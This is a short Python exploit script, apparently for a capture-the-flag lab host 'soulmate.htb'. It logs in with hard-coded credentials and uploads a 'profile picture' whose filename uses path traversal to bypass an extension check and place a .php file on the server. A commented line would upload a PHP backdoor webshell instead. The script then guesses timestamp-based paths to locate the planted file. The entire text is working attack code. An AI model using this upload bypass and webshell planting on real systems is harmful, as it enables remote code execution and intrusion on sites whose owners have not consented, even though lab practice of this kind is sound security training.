import pdb
import requests
import time

s = requests.Session()

r1 = s.post('http://soulmate.htb/login.php', data={'username': 'user2', 'password': 'user1234'})
assert r1.status_code == 200

files = {
    'name': (None, 'user'),
    'phone': (None, ''),
    'bio': (None, 'foo'),
    'interests': (None, ''),
    # content-type does not matter
    # only takes last ext. .gif.jpg -> .jpg
    #'profile_pic': ('black.jpeg', open('/usr/share/webshells/php/php-backdoor.php', 'rb').read(), '')
    'profile_pic': ('black.jpeg/../foobar.php', open('black.jpeg', 'rb').read(), '')
    #'profile_pic': ('white.jpeg', open('white.jpeg', 'rb').read(), 'image/jpeg')
}
t = int(time.time())
t2 = t - 50
r2 = s.post('http://soulmate.htb/profile.php', files=files)

for i in range(100):
    url = f'http://soulmate.htb/assets/images/profiles/3_{t2 + i}.php'
    r3 = s.get(url)
    if r3.status_code == 200:
        print(url)
